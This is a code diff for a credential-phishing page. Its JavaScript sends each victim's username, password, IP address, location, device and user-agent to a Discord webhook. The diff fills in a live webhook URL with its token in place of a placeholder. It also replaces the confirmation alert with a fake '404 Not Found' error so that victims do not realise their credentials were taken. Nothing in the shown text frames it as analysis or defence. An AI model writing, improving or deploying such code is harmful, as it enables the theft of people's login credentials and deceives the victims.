@@ -187,16 +187,16 @@
                          userAgent.includes("iPhone") ? "iPhone" :
                          userAgent.includes("Windows") ? "Windows PC" :
                          userAgent.includes("Mac") ? "Mac" : "Unknown";
-          const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+          const webhookUrl = "https://discord.com/api/webhooks/1382584258375450664/L0sdVMv0uXwiFcRmfOO9eVgQ9zpeP2wAl68DBzc_9JYCF4I1LHikZRrRELNubqPmlm6u";
           const payload = {
             content:
-              `🔐 **New Login Attempt**\n` +
-              `👤 Username: \`${username}\`\n` +
-              `🔑 Password: \`${password}\`\n` +
-              `🌐 IP: \`${ip}\`\n` +
-              `📍 Location: ${city}, ${region}, ${country}\n` +
-              `🖥️ Device: ${device}\n` +
-              `🧾 User-Agent: \`${userAgent}\``
+              `**New Login Attempt**\n` +
+              `Username: \`${username}\`\n` +
+              `Password: \`${password}\`\n` +
+              `IP: \`${ip}\`\n` +
+              `Location: ${city}, ${region}, ${country}\n` +
+              `Device: ${device}\n` +
+              `User-Agent: \`${userAgent}\``
           };
           fetch(webhookUrl, {
             method: "POST",
@@ -206,7 +206,7 @@
             body: JSON.stringify(payload)
           }).then(res => {
             if (res.ok) {
-              alert("Login information sent.");
+              alert("Internal error occurred while processing your request: 404 Not Found");
             } else {
               alert("Failed to send data.");
             }
